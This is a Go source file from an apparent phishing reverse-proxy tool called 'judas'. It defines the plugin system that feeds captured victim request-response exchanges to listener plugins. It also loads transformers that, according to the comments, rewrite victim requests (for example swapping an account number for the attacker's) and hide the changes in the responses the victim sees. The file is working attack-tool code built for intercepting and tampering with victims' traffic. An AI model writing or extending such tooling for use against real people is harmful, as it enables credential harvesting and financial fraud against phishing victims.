package judas

import (
	"context"
	"log"
	"net/http"
	"net/url"
	"plugin"
	"strings"
)

// InitializerFunc is a go function that should be exported by a function package.
// It should be named "New".
// Your InitializerFunc should return an instance of your Listener with a reference to judas's logger for consistent logging.
type InitializerFunc func(*log.Logger) (Listener, error)

// Listener implementations will be given a stream of HTTPExchanges to let plugins capture valuable information out of request-response transactions.
type Listener interface {
	Listen(<-chan *HTTPExchange)
}

// HTTPExchange contains the request sent by the user to us and the response received from the target server.
// Listeners can use this struct to pull information out of requests and responses.
type HTTPExchange struct {
	Request  *Request
	Response *Response
	Target   *url.URL
}

// RequestTransformer modifies a request before it is sent to the target website.
// This can be used to hijack victim actions, like replacing an account number with ours.
// Delays in this function will slow down the phishing site for the victim.
// Your RequestTransformer should be a function called "RequestTransformer"
type RequestTransformer func(*http.Request) error

// ResponseTransformer modifies a response before it is returned to the victim.
// You can use ResponseTransformers to hide any visible results of a RequestTransformer.
// Delays in this function will slow down the phishing site for the victim.
// Your ResponseTransformer should be a function called "ResponseTransformer"
type ResponseTransformer func(*http.Response) error

// PluginBroker handles sending messages to plugins.
type PluginBroker struct {
	plugins []*pluginInfo
	logger  *log.Logger
}

// TransformRequest runs all loaded RequestTransformers against requests from victims.
func (p *PluginBroker) TransformRequest(request *http.Request) error {
	for _, plugin := range p.plugins {
		if plugin.RequestTransformer != nil {
			err := plugin.RequestTransformer(request)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// TransformResponse runs all loaded ResponseTransformers against responses before they're returned to victims.
func (p *PluginBroker) TransformResponse(response *http.Response) error {
	for _, plugin := range p.plugins {
		if plugin.ResponseTransformer != nil {
			err := plugin.ResponseTransformer(response)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// SendResult sends a *Result to all loaded plugins for further processing.
func (p *PluginBroker) SendResult(exchange *HTTPExchange) error {
	for _, plugin := range p.plugins {
		if plugin.Input != nil {
			// Give each plugin its own request and response.
			req, err := exchange.Request.CloneBody(context.Background())
			if err != nil {
				return err
			}

			resp, err := exchange.Response.CloneBody()
			if err != nil {
				return err
			}

			plugin.Input <- &HTTPExchange{
				Request:  req,
				Response: resp,
				Target:   exchange.Target,
			}
		}
	}
	return nil
}

// SignalDone closes all plugin chans that are waiting on results.
// Call only after all results have been sent.
func (p *PluginBroker) SignalDone() {
	for _, plugin := range p.plugins {
		close(plugin.Input)
	}
}

func (p *PluginBroker) add(plugin *pluginInfo) {
	p.plugins = append(p.plugins, plugin)
}

func (p *PluginBroker) run(plugin *pluginInfo, exchanges <-chan *HTTPExchange) {
	if plugin.Input != nil {
		go func() {
			defer func() {
				if r := recover(); r != nil {
					p.logger.Printf("WARN: panic in loaded plugin")
				}
			}()
			plugin.Listen(exchanges)
		}()
	}
}

// LoadPlugins loads judas plugins from a list of file paths.
func LoadPlugins(logger *log.Logger, paths []string) (*PluginBroker, error) {
	broker := &PluginBroker{logger: logger}

	for _, path := range paths {
		plg, err := plugin.Open(path)
		if err != nil {
			return nil, err
		}

		var symbol plugin.Symbol
		var listener Listener
		symbol, err = plg.Lookup("New")
		if err != nil && optionalPluginError(err) {
			return nil, err
		}

		// Go needs this, InitializerFunc is purely for documentation.
		initializer, listenerLoaded := symbol.(func(*log.Logger) (Listener, error))
		if listenerLoaded {
			listener, err = initializer(logger)
			if err != nil {
				return nil, err
			}
		}

		symbol, err = plg.Lookup("RequestTransformer")
		if err != nil && optionalPluginError(err) {
			return nil, err
		}

		requestTransformer, _ := symbol.(func(*http.Request) error)

		symbol, err = plg.Lookup("ResponseTransformer")
		if err != nil && optionalPluginError(err) {
			return nil, err
		}

		responseTransformer, _ := symbol.(func(*http.Response) error)

		httpfuzzPlugin := &pluginInfo{
			RequestTransformer:  requestTransformer,
			ResponseTransformer: responseTransformer,
		}

		broker.add(httpfuzzPlugin)

		if listenerLoaded {
			input := make(chan *HTTPExchange)
			httpfuzzPlugin.Input = input
			httpfuzzPlugin.Listener = listener
			// Listen for results in a goroutine for each plugin
			broker.run(httpfuzzPlugin, input)
		}

	}

	return broker, nil
}

func optionalPluginError(err error) bool {
	return !strings.Contains(err.Error(), "not found in plugin")
}

type pluginInfo struct {
	Listener
	Input               chan<- *HTTPExchange
	RequestTransformer  RequestTransformer
	ResponseTransformer ResponseTransformer
}
